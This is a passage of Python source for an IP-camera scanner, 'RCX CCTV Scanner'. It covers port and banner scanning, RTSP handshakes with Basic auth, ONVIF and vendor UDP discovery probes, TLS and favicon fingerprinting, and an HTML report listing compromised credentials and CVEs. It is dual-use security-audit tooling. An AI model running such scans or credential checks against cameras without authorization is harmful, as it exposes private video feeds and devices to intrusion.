            f"<tr class='vuln-row'><td><span class='badge warn'>{c['user']}</span></td>"
            f"<td><span class='badge warn'>{c['password']}</span></td>"
            f"<td><span class='dim-txt'>{c['url']}</span></td><td>{copy_btn}</td></tr>"
        )
    return "".join(rows)

def _render_cve_rows(cves: List[Dict[str, Any]]) -> str:
    if not cves:
        return "<tr><td colspan=5 class='dim-txt'>No exploitable CVEs confirmed</td></tr>"
    rows = []
    for c in cves:
        rows.append(
            f"<tr class='vuln-row'><td><span class='badge danger'>{c['cve']}</span></td>"
            f"<td><b>{c['brand']}</b></td><td>:{c['port']}</td>"
            f"<td><span class='badge warn'>{c.get('severity','HIGH')}</span></td>"
            f"<td>{c['desc']}</td></tr>"
        )
    return "".join(rows)

def _render_simple_rows(items: List[str]) -> str:
    if not items:
        return "<tr><td class='dim-txt'>—</td></tr>"
    return "".join(f"<tr><td><span class='stream-link'>{i}</span></td></tr>" for i in items)

HTML_STYLES = """
  :root {
    --bg:
    --header-bg: rgba(15, 23, 42, 0.85);
    --card:
    --card-hover:
    --border:
    --border-hover:
    --text:
    --dim:
    --accent:
    --accent-glow: rgba(56, 189, 248, 0.15);
    --danger:
    --danger-bg: rgba(239, 68, 68, 0.12);
    --warn:
    --warn-bg: rgba(245, 158, 11, 0.12);
    --ok:
    --ok-bg: rgba(16, 185, 129, 0.12);
    --shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
  }
  body.light-theme {
    --bg:
    --header-bg: rgba(255, 255, 255, 0.85);
    --card:
    --card-hover:
    --border:
    --border-hover:
    --text:
    --dim:
    --accent:
    --accent-glow: rgba(2, 132, 199, 0.1);
    --danger:
    --danger-bg: rgba(220, 38, 38, 0.1);
    --warn:
    --warn-bg: rgba(217, 119, 6, 0.1);
    --ok:
    --ok-bg: rgba(5, 150, 105, 0.1);
    --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
  }
  * { box-sizing: border-box; }
  body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', monospace; margin: 0; padding: 0 20px 40px; transition: background 0.3s ease, color 0.3s ease; }
  .sticky-nav { position: sticky; top: 0; z-index: 1000; backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); background: var(--header-bg); border-bottom: 1px solid var(--border); padding: 14px 24px; margin: 0 -20px 24px -20px; display: flex; align-items: center; justify-content: space-between; box-shadow: var(--shadow); }
  .nav-brand { display: flex; align-items: center; gap: 12px; }
  .nav-title { font-size: 1.25rem; font-weight: 800; background: linear-gradient(90deg,
  .nav-sub { font-size: 0.8rem; color: var(--dim); }
  .nav-actions { display: flex; align-items: center; gap: 12px; }
  .theme-btn { background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 6px 14px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; display: inline-flex; align-items: center; gap: 6px; transition: all 0.2s ease; }
  .theme-btn:hover { border-color: var(--accent); background: var(--card-hover); }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(380px, 1fr)); gap: 20px; margin-bottom: 24px; }
  .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; box-shadow: var(--shadow); transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease; }
  .card:hover { transform: translateY(-2px); border-color: var(--border-hover); box-shadow: 0 14px 28px -8px var(--accent-glow); }
  .card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
  .card-title { display: flex; align-items: center; gap: 8px; font-size: 1rem; font-weight: 700; color: var(--accent); margin: 0; }
  .score-box { display: flex; align-items: center; justify-content: space-around; padding: 12px 0; }
  .score-ring { width: 100px; height: 100px; position: relative; display: flex; align-items: center; justify-content: center; }
  .score-val { font-size: 1.5rem; font-weight: 800; }
  .badge { display: inline-flex; align-items: center; gap: 4px; padding: 3px 8px; border-radius: 6px; font-size: 0.75rem; font-weight: 700; }
  .badge.ok { background: var(--ok-bg); color: var(--ok); border: 1px solid var(--ok); }
  .badge.warn { background: var(--warn-bg); color: var(--warn); border: 1px solid var(--warn); }
  .badge.danger { background: var(--danger-bg); color: var(--danger); border: 1px solid var(--danger); }
  .badge.info { background: var(--accent-glow); color: var(--accent); border: 1px solid var(--accent); }
  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
  th { padding: 10px 12px; text-align: left; border-bottom: 2px solid var(--border); color: var(--dim); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.05em; user-select: none; }
  th.sortable { cursor: pointer; transition: color 0.2s ease; }
  th.sortable:hover { color: var(--accent); }
  td { padding: 9px 12px; text-align: left; border-bottom: 1px solid var(--border); }
  tr:hover { background: var(--accent-glow); }
  .vuln-row { background: var(--danger-bg) !important; }
  .port-num { color: var(--accent); font-weight: 700; }
  .dim-txt { color: var(--dim); }
  .copy-btn { background:
  .copy-btn:hover { background:
  .filter-input { background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 6px 12px; border-radius: 6px; font-size: 0.8rem; outline: none; transition: border-color 0.2s ease; }
  .filter-input:focus { border-color: var(--accent); }
  .stream-link { font-family: monospace; font-size: 0.8rem; word-break: break-all; }
  footer { text-align: center; margin-top: 40px; color: var(--dim); font-size: 0.8rem; border-top: 1px solid var(--border); padding-top: 20px; }
"""

HTML_SCRIPTS = """
function toggleTheme() {
  const isLight = document.body.classList.toggle('light-theme');
  localStorage.setItem('cctv_theme', isLight ? 'light' : 'dark');
  document.getElementById('themeBtn').innerHTML = isLight ? '🌙 Dark' : '☀️ Light';
}
(function() {
  if (localStorage.getItem('cctv_theme') === 'light') {
    document.body.classList.add('light-theme');
    window.addEventListener('DOMContentLoaded', () => {
      const b = document.getElementById('themeBtn');
      if (b) b.innerHTML = '🌙 Dark';
    });
  }
})();
function copyCred(u, p, btn) {
  navigator.clipboard.writeText(u + ":" + p).then(() => {
    const orig = btn.innerHTML;
    btn.innerHTML = "✓ Copied";
    btn.style.background = "#10b981";
    setTimeout(() => { btn.innerHTML = orig; btn.style.background = "#2563eb"; }, 1800);
  });
}
function filterTable(inputId, tableId) {
  const val = document.getElementById(inputId).value.toLowerCase();
  const rows = document.getElementById(tableId).querySelectorAll("tbody tr");
  rows.forEach(r => {
    r.style.display = r.innerText.toLowerCase().includes(val) ? "" : "none";
  });
}
function sortTable(tableId, colIdx, isNum) {
  const tbl = document.getElementById(tableId);
  const tbody = tbl.querySelector('tbody') || tbl;
  const rows = Array.from(tbody.querySelectorAll('tr')).filter(r => !r.querySelector('th'));
  const curDir = tbl.getAttribute('data-sort-dir') === 'asc' ? 'desc' : 'asc';
  tbl.setAttribute('data-sort-dir', curDir);
  rows.sort((a, b) => {
    const tA = (a.cells[colIdx]?.innerText || '').trim();
    const tB = (b.cells[colIdx]?.innerText || '').trim();
    if (isNum) {
      const nA = parseFloat(tA.replace(/[^0-9.-]/g, '')) || 0;
      const nB = parseFloat(tB.replace(/[^0-9.-]/g, '')) || 0;
      return curDir === 'asc' ? nA - nB : nB - nA;
    }
    return curDir === 'asc' ? tA.localeCompare(tB) : tB.localeCompare(tA);
  });
  rows.forEach(r => tbody.appendChild(r));
}
"""

def _generate_html_report(d: Dict[str, Any]) -> str:
    p_tbl = _render_port_rows(d["open_ports"], d["rtsp_ports"], d["banners"])
    c_tbl = _render_cred_rows(d["valid_creds"])
    v_tbl = _render_cve_rows(d["cves"])
    s_tbl = _render_simple_rows(d["streams"])
    a_tbl = _render_simple_rows(d["auth_pages"][:30])
    b_str = ", ".join(d["brands"]) or "Unknown"
    dev_str = "".join(f"<tr><td><b>{k}</b></td><td><span class='badge ok'>{v}</span></td></tr>" for k, v in d['device_info'].items()) or "<tr><td class='dim-txt'>No device info</td></tr>"
    score_status = "CRITICAL" if (d["valid_creds"] or d["cves"]) else ("CAUTION" if d["open_ports"] else "SECURE")
    score_color = "#ef4444" if (d["valid_creds"] or d["cves"]) else ("#f59e0b" if d["open_ports"] else "#10b981")
    score_stroke = 283 if (d["valid_creds"] or d["cves"]) else (140 if d["open_ports"] else 20)
    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CCTV Scan: {d['ip']}</title><style>{HTML_STYLES}</style><script>{HTML_SCRIPTS}</script></head><body>
<div class="sticky-nav">
  <div class="nav-brand">
    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    <div>
      <div class="nav-title">RCX CCTV SCANNER v1.5</div>
      <div class="nav-sub">Target: <b>{d['ip']}</b> | Brands: <b>{b_str}</b></div>
    </div>
  </div>
  <div class="nav-actions">
    <span class="badge" style="background:{score_color}22; color:{score_color}; border:1px solid {score_color};">{score_status}</span>
    <button class="theme-btn" id="themeBtn" onclick="toggleTheme()">☀️ Light</button>
  </div>
</div>
<div class="grid">
  <div class="card">
    <div class="card-header">
      <h3 class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg> Executive Metrics</h3>
    </div>
    <div class="score-box">
      <div class="score-ring">
        <svg viewBox="0 0 100 100" width="100" height="100">
          <circle cx="50" cy="50" r="45" fill="none" stroke="var(--border)" stroke-width="8"/>
          <circle cx="50" cy="50" r="45" fill="none" stroke="{score_color}" stroke-width="8" stroke-dasharray="283" stroke-dashoffset="{283 - score_stroke}" stroke-linecap="round" transform="rotate(-90 50 50)"/>
        </svg>
        <div style="position:absolute; text-align:center;">
          <div class="score-val" style="color:{score_color};">{len(d['valid_creds']) + len(d['cves'])}</div>
          <div style="font-size:0.65rem; color:var(--dim);">ISSUES</div>
        </div>
      </div>
      <div>
        <table>
          <tr><td>Open Ports</td><td><span class="badge info">{len(d['open_ports'])}</span></td></tr>
          <tr><td>RTSP Ports</td><td><span class="badge info">{len(d['rtsp_ports'])}</span></td></tr>
          <tr><td>Valid Creds</td><td>{'<span class="badge danger">'+str(len(d['valid_creds']))+' COMPROMISED</span>' if d['valid_creds'] else '<span class="badge ok">0</span>'}</td></tr>
          <tr><td>Confirmed CVEs</td><td>{'<span class="badge danger">'+str(len(d['cves']))+' VULNERABLE</span>' if d['cves'] else '<span class="badge ok">0</span>'}</td></tr>
        </table>
      </div>
    </div>
  </div>
  <div class="card">
    <div class="card-header">
      <h3 class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg> Device Fingerprints</h3>
    </div>
    <table>{dev_str}</table>
  </div>
</div>
<div class="card" style="margin-bottom: 24px;">
  <div class="card-header">
    <h3 class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg> Open Network Ports ({len(d['open_ports'])})</h3>
    <input class="filter-input" id="pF" onkeyup="filterTable('pF','pT')" placeholder="Filter ports...">
  </div>
  <table id="pT">
    <thead>
      <tr>
        <th class="sortable" onclick="sortTable('pT',0,true)">Port ⬍</th>
        <th class="sortable" onclick="sortTable('pT',1,false)">Service ⬍</th>
        <th class="sortable" onclick="sortTable('pT',2,false)">Tag ⬍</th>
        <th>RTSP</th>
        <th>TLS</th>
        <th>Banner</th>
      </tr>
    </thead>
    <tbody>{p_tbl}</tbody>
  </table>
</div>
<div class="grid">
  <div class="card">
    <div class="card-header">
      <h3 class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-1.5 1.5L14 9l-1.5-1.5L10 10l-1.5-1.5L7 10a5 5 0 1 0 7 7l7-7-1.5-1.5z"/></svg> Valid Credentials ({len(d['valid_creds'])})</h3>
    </div>
    <table><thead><tr><th>User</th><th>Password</th><th>URL</th><th>Action</th></tr></thead><tbody>{c_tbl}</tbody></table>
  </div>
  <div class="card">
    <div class="card-header">
      <h3 class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg> Confirmed CVEs ({len(d['cves'])})</h3>
    </div>
    <table><thead><tr><th>CVE</th><th>Brand</th><th>Port</th><th>Severity</th><th>Description</th></tr></thead><tbody>{v_tbl}</tbody></table>
  </div>
</div>
<div class="grid">
  <div class="card">
    <div class="card-header">
      <h3 class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg> Streams ({len(d['streams'])})</h3>
    </div>
    <table><tbody>{s_tbl}</tbody></table>
  </div>
  <div class="card">
    <div class="card-header">
      <h3 class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg> Auth Pages ({len(d['auth_pages'])})</h3>
    </div>
    <table><tbody>{a_tbl}</tbody></table>
  </div>
</div>
<footer>RCX CCTV Scanner v1.5 · Authorized Security Audit Report</footer>
</body></html>"""
def make_session(proxy: Optional[str] = None, user_agent: Optional[str] = None) -> requests.Session:
    s = requests.Session()
    ua = user_agent or (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    )
    s.headers.update({"User-Agent": ua, "Accept": "*/*", "Connection": "keep-alive"})
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    adapter = HTTPAdapter(max_retries=0, pool_connections=100, pool_maxsize=200)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s

def rate_limit_sleep(ctx: Optional[ScanContext]) -> None:
    if not ctx or ctx.rate <= 0.0:
        return
    interval = 1.0 / ctx.rate
    with ctx.rate_lock:
        now = time.time()
        elapsed = now - ctx.last_req_time
        if elapsed < interval:
            time.sleep(interval - elapsed)
        ctx.last_req_time = time.time()

def http_get(
    url: str,
    timeout: float = 4.0,
    auth: Any = None,
    stream: bool = False,
    session: Optional[requests.Session] = None,
    ctx: Optional[ScanContext] = None,
) -> Optional[requests.Response]:
    rate_limit_sleep(ctx)
    sess = session or make_session()
    try:
        return sess.get(url, timeout=timeout, verify=False, auth=auth, stream=stream, allow_redirects=True)
    except Exception as e:
        vprint(f"GET {url} failed: {type(e).__name__}", ctx)
        return None

def http_post(
    url: str,
    data: Any = None,
    json_data: Any = None,
    headers: Optional[Dict[str, str]] = None,
    timeout: float = 4.0,
    session: Optional[requests.Session] = None,
    ctx: Optional[ScanContext] = None,
) -> Optional[requests.Response]:
    rate_limit_sleep(ctx)
    sess = session or make_session()
    h = dict(sess.headers)
    if headers:
        h.update(headers)
    try:
        return sess.post(url, data=data, json=json_data, headers=h, timeout=timeout, verify=False, allow_redirects=True)
    except Exception as e:
        vprint(f"POST {url} failed: {type(e).__name__}", ctx)
        return None

def http_put(
    url: str,
    data: bytes,
    headers: Optional[Dict[str, str]] = None,
    timeout: float = 4.0,
    session: Optional[requests.Session] = None,
    ctx: Optional[ScanContext] = None,
) -> Optional[requests.Response]:
    rate_limit_sleep(ctx)
    sess = session or make_session()
    h = dict(sess.headers)
    if headers:
        h.update(headers)
    try:
        return sess.put(url, data=data, headers=h, timeout=timeout, verify=False)
    except Exception as e:
        vprint(f"PUT {url} failed: {type(e).__name__}", ctx)
        return None

def proto(port: int) -> str:
    return "https" if port in HTTPS_PORTS else "http"

async def _tcp_connect(ip: str, port: int, timeout: float) -> bool:
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
        w.close()
        try:
            await w.wait_closed()
        except Exception:
            pass
        return True
    except Exception:
        return False

async def _grab_banner(ip: str, port: int, timeout: float = 1.5) -> str:
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
        try:
            data = await asyncio.wait_for(r.read(512), timeout=1.0)
            w.close()
            return data.decode("utf-8", errors="replace").strip()[:120]
        except Exception:
            pass
        w.close()
    except Exception:
        pass
    return ""

async def _rtsp_probe(ip: str, port: int, timeout: float = 2.0) -> bool:
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
        pkt = f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode()
        w.write(pkt)
        await w.drain()
        data = await asyncio.wait_for(r.read(256), timeout=timeout)
        w.close()
        return b"RTSP/1.0" in data
    except Exception:
        return False

async def _grab_http_banner(ip: str, port: int, timeout: float = 1.5) -> str:
    is_tls = port in HTTPS_PORTS
    try:
        ssl_ctx = None
        if is_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
        r, w = await asyncio.wait_for(
            asyncio.open_connection(ip, port, ssl=ssl_ctx), timeout
        )
        req = f"GET / HTTP/1.1\r\nHost: {ip}:{port}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
        w.write(req.encode())
        await w.drain()
        data = await asyncio.wait_for(r.read(1024), timeout=timeout)
        w.close()
        try:
            await w.wait_closed()
        except Exception:
            pass
        header_text = data.decode("latin1", errors="replace")
        server = ""
        auth = ""
        for line in header_text.split("\r\n"):
            low = line.lower()
            if low.startswith("server:"):
                server = line[7:].strip()
            elif low.startswith("www-authenticate:"):
                auth = line[17:].strip()
        parts = []
        if server:
            parts.append(f"Server: {server}")
        if auth:
            parts.append(f"Auth: {auth}")
        return " | ".join(parts)
    except Exception:
        return ""

async def scan_ports_async(
    ip: str,
    ports: List[int],
    timeout: float,
    concurrency: int,
    ctx: Optional[ScanContext] = None,
) -> Tuple[List[int], List[int], Dict[int, str]]:
    sem = asyncio.Semaphore(concurrency)
    lock = asyncio.Lock()
    open_p: List[int] = []
    rtsp_p: List[int] = []
    banners: Dict[int, str] = {}
    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=30),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
        console=RC,
    ) as progress:
        task = progress.add_task(f"Scanning {len(ports)} ports on {ip}", total=len(ports))
        async def check(port: int) -> None:
            async with sem:
                ok = await _tcp_connect(ip, port, timeout)
                async with lock:
                    progress.advance(task)
                if not ok:
                    return
                async with lock:
                    open_p.append(port)
                is_rtsp = port in RTSP_PORTS_SET or await _rtsp_probe(ip, port, timeout)
                if is_rtsp:
                    async with lock:
                        rtsp_p.append(port)
                ban = ""
                if port in HTTPS_PORTS or (port not in SKIP_PORTS and port not in RTSP_PORTS_SET):
                    ban = await _grab_http_banner(ip, port, 1.5)
                elif port not in HTTPS_PORTS and port in SKIP_PORTS:
                    ban = await _grab_banner(ip, port, 1.5)
                if ban:
                    async with lock:
                        banners[port] = ban
                svc_n, svc_t = SVC.get(port, ("TCP", ""))
                lbl = "RTSP" if is_rtsp else (f"{svc_n} ({svc_t})" if svc_t else svc_n)
                cprint(f"  [+] [{port}/tcp] {lbl}", G)
        await asyncio.gather(*[check(p) for p in ports])
    return sorted(open_p), sorted(rtsp_p), banners
def run_portscan(
    ip: str,
    ports: List[int],
    timeout: float,
    concurrency: int,
    ctx: Optional[ScanContext] = None,
) -> Tuple[List[int], List[int], Dict[int, str]]:
    section(f"🔍 High-Speed Port Discovery — {ip}")
    cprint(f"  Target: {ip} | Ports: {len(ports)} | Timeout: {timeout}s | Concurrency: {concurrency}", Y)
    open_p, rtsp_p, bans = asyncio.run(scan_ports_async(ip, ports, timeout, concurrency, ctx))
    if not open_p:
        key = [p for p in PORTS_CAM if p in ports]
        if key:
            cprint(f"  ⚠️  0 open — retrying {len(key)} camera ports with timeout ×2...", Y)
            open_p, rtsp_p, bans = asyncio.run(
                scan_ports_async(ip, key, timeout * 2, min(concurrency, 60), ctx)
            )
    cprint(f"\n  📊 Scan Finished: {len(ports)} checked | {len(open_p)} open | {len(rtsp_p)} RTSP", Y)
    return open_p, rtsp_p, bans

def _parse_der_cert(der: bytes, out: Dict[str, Any]) -> None:
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID, ExtensionOID
        cert = x509.load_der_x509_certificate(der)
        sub_cn = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
        if sub_cn:
            out["subject_cn"] = str(sub_cn[0].value)
        sub_o = cert.subject.get_attributes_for_oid(NameOID.ORGANIZATION_NAME)
        if sub_o:
            out["subject_o"] = str(sub_o[0].value)
        sub_ou = cert.subject.get_attributes_for_oid(NameOID.ORGANIZATIONAL_UNIT_NAME)
        if sub_ou:
            out["subject_ou"] = str(sub_ou[0].value)
        iss_cn = cert.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)
        if iss_cn:
            out["issuer_cn"] = str(iss_cn[0].value)
        iss_o = cert.issuer.get_attributes_for_oid(NameOID.ORGANIZATION_NAME)
        if iss_o:
            out["issuer_o"] = str(iss_o[0].value)
        out["not_before"] = cert.not_valid_before_utc.isoformat() if hasattr(cert, "not_valid_before_utc") else str(getattr(cert, "not_valid_before", ""))
        out["not_after"] = cert.not_valid_after_utc.isoformat() if hasattr(cert, "not_valid_after_utc") else str(getattr(cert, "not_valid_after", ""))
        try:
            now_dt = datetime.now(timezone.utc)
            exp_dt = cert.not_valid_after_utc if hasattr(cert, "not_valid_after_utc") else cert.not_valid_after.replace(tzinfo=timezone.utc)
            out["is_expired"] = now_dt > exp_dt
        except Exception:
            out["is_expired"] = False
        out["is_self_signed"] = cert.issuer == cert.subject
        out["serial"] = hex(cert.serial_number)
        try:
            out["sig_algo"] = cert.signature_hash_algorithm.name if cert.signature_hash_algorithm else getattr(cert.signature_algorithm_oid, "_name", "")
        except Exception:
            pass
        try:
            pub_key = cert.public_key()
            if hasattr(pub_key, "key_size"):
                out["key_info"] = f"{pub_key.__class__.__name__} {pub_key.key_size}-bit"
        except Exception:
            pass
        try:
            san_ext = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
            sans = [str(getattr(x, "value", x)) for x in san_ext.value]
            out["san"] = ", ".join(sans)
        except Exception:
            pass
    except Exception:
        pass

def grab_tls_cert(ip: str, port: int, timeout: float = 4.0) -> Optional[Dict[str, Any]]:
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=ip) as ssock:
                der = ssock.getpeercert(binary_form=True) or b""
                cipher = ssock.cipher()
        out: Dict[str, Any] = {
            "subject_cn": "", "subject_o": "", "subject_ou": "", "issuer_cn": "",
            "issuer_o": "", "not_before": "", "not_after": "", "is_expired": False,
            "is_self_signed": False, "serial": "", "sig_algo": "", "key_info": "",
            "cipher": cipher[0] if cipher else "",
            "fingerprint": hashlib.sha256(der).hexdigest()[:16] if der else "",
            "san": "", "brand_hint": "",
        }
        if der:
            _parse_der_cert(der, out)
        all_txt = " ".join([out["subject_cn"], out["subject_o"], out["subject_ou"], out["issuer_cn"], out["issuer_o"], out["san"]]).lower()
        for brand in BRANDS:
            if brand in all_txt:
                out["brand_hint"] = brand
                break
        return out
    except Exception:
        return None
def get_favicon_hash(
    ip: str,
    port: int,
    timeout: float = 3.0,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> Optional[Tuple[str, str]]:
    pr = proto(port)
    for path in ["/favicon.ico", "/favicon.png", "/img/favicon.ico"]:
        r = http_get(f"{pr}://{ip}:{port}{path}", timeout=timeout, session=session, ctx=ctx)
        if r and r.status_code == 200 and len(r.content) > 32:
            h = hashlib.md5(r.content).hexdigest()[:8]
            brand = FAVICON_HASHES.get(h, "unknown")
            vprint(f"Favicon {path} hash={h} brand={brand}", ctx)
            return h, brand
    return None

def rtsp_full_handshake(
    ip: str,
    port: int,
    timeout: float = 4.0,
    user: str = "",
    pw: str = "",
) -> Optional[Dict[str, str]]:
    info: Dict[str, str] = {}
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            opt_req = f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: LibVLC/3.0.18\r\n\r\n"
            s.sendall(opt_req.encode())
            resp1 = s.recv(2048).decode("utf-8", errors="replace")
            if "RTSP/1.0 200" in resp1:
                m_pub = re.search(r"Public:\s*([^\r\n]+)", resp1, re.I)
                if m_pub:
                    info["public"] = m_pub.group(1).strip()
            desc_req = f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\n"
            if user:
                token = base64.b64encode(f"{user}:{pw}".encode()).decode()
                desc_req += f"Authorization: Basic {token}\r\n"
            desc_req += "\r\n"
            s.sendall(desc_req.encode())
            resp2 = s.recv(4096).decode("utf-8", errors="replace")
            if "m=video" in resp2:
                info["sdp"] = resp2[:300]
                codecs = re.findall(r"a=rtpmap:\d+\s+([A-Za-z0-9\-]+)", resp2)
                if codecs:
                    info["codecs"] = ", ".join(codecs)
            return info if info else None
    except Exception:
        return None

def probe_onvif(
    ip: str,
    port: int,
    timeout: float = 5.0,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> Dict[str, Any]:
    pr = proto(port)
    envelope = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
        'xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
        "<s:Body><tds:GetDeviceInformation/></s:Body></s:Envelope>"
    )
    hdrs = {"Content-Type": "application/soap+xml; charset=utf-8"}
    eps = [
        f"{pr}://{ip}:{port}/onvif/device_service",
        f"{pr}://{ip}:{port}/onvif/deviceio_service",
        f"{pr}://{ip}:{port}/onvif/media_service",
        f"{pr}://{ip}:{port}/ISAPI/Streaming/channels/101",
    ]
    res: Dict[str, Any] = {}
    for ep in eps:
        r = http_post(ep, data=envelope.encode(), headers=hdrs, timeout=timeout, session=session, ctx=ctx)
        if r and r.status_code in (200, 400, 401):
            res["endpoint"] = ep
            res["status"] = r.status_code
            txt = r.text or ""
            for tag in ["Manufacturer", "Model", "FirmwareVersion", "SerialNumber", "HardwareId"]:
                m = re.search(rf"<(?:tds:|tt:|)[A-Za-z]*{tag}[^>]*>([^<]+)<", txt, re.I)
                if m:
                    res[tag.lower()] = m.group(1).strip()
            if res:
                break
    return res

async def _async_probe_udp_single(ip: str, port: int, pkt: bytes, name: str, timeout: float = 0.5) -> Tuple[str, str]:
    loop = asyncio.get_running_loop()
    def _do_send() -> Tuple[str, str]:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(timeout)
                s.sendto(pkt, (ip, port))
                data, _ = s.recvfrom(2048)
                if data:
                    return name, data.decode("utf-8", errors="replace").strip()[:100]
        except Exception:
            pass
        return name, ""
    return await loop.run_in_executor(None, _do_send)

async def probe_udp_services_async(ip: str, timeout: float = 0.5) -> Dict[str, str]:
    ws_probe = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
        'xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery">'
        '<s:Body><d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe></s:Body></s:Envelope>'
    )
    ssdp_probe = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
    sadp_probe = b'<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>00000000-0000-0000-0000-000000000000</Uuid><Types>inquiry</Types></Probe>'
    targets = [
        (3702, ws_probe.encode(), "ONVIF-WS-Discovery"),
        (1900, ssdp_probe.encode(), "UPnP-SSDP"),
        (37020, sadp_probe, "Hikvision-SADP"),
        (37810, b"DHIP\x00\x00\x00\x00", "Dahua-DHDiscover"),
    ]
    tasks = [_async_probe_udp_single(ip, port, pkt, name, timeout) for port, pkt, name in targets]
    results = await asyncio.gather(*tasks)
    found: Dict[str, str] = {}
    for name, txt in results:
        if txt:
            found[name] = txt
            cprint(f"  [+] UDP Responder active: {name}", G)
    return found

def probe_udp_services(ip: str, timeout: float = 0.5) -> Dict[str, str]:
    return asyncio.run(probe_udp_services_async(ip, timeout))

async def _async_probe_snmp_single(ip: str, comm: str, timeout: float = 0.5) -> Tuple[str, bool]:
    loop = asyncio.get_running_loop()
    def _do_snmp() -> Tuple[str, bool]:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(timeout)
                comm_bytes = comm.encode()
                pkt = (
                    b"\x30\x26\x02\x01\x00\x04"
                    + bytes([len(comm_bytes)])
                    + comm_bytes
